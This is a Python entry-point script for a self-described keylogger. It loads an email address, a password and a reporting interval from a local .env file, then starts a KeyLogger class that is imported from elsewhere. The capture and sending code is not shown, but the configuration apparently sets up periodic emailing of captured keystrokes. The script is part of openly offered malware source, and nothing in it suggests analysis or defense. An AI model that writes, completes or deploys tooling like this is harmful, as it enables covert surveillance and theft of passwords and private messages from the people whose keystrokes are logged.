#!/usr/bin/env python3
"""
Keylogger entry point – loads configuration exclusively from a local .env file.
"""

import sys
from pathlib import Path
from keylogger import KeyLogger


def load_config(env_path: Path) -> dict:
    """Parse the .env file and return a config dictionary."""
    if not env_path.is_file():
        print(f'ERROR: .env file not found at {env_path}')
        sys.exit(1)

    config = {}
    with open(env_path, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#') or '=' not in line:
                continue
            key, value = line.split('=', 1)
            key = key.strip()
            value = value.strip().strip('"').strip("'")
            config[key] = value

    missing = [r for r in ['KL_EMAIL', 'KL_PASS'] if r not in config]
    if missing:
        print(f'ERROR: Missing required .env keys: {", ".join(missing)}')
        sys.exit(1)

    return config


if __name__ == '__main__':
    env_file = Path(__file__).resolve().parent / '.env'
    cfg = load_config(env_file)

    config = {
        'email': cfg['KL_EMAIL'],
        'password': cfg['KL_PASS'],
        'interval': int(cfg.get('KL_INTERVAL', '300')),
    }

    keylogger = KeyLogger(config)
    keylogger.start()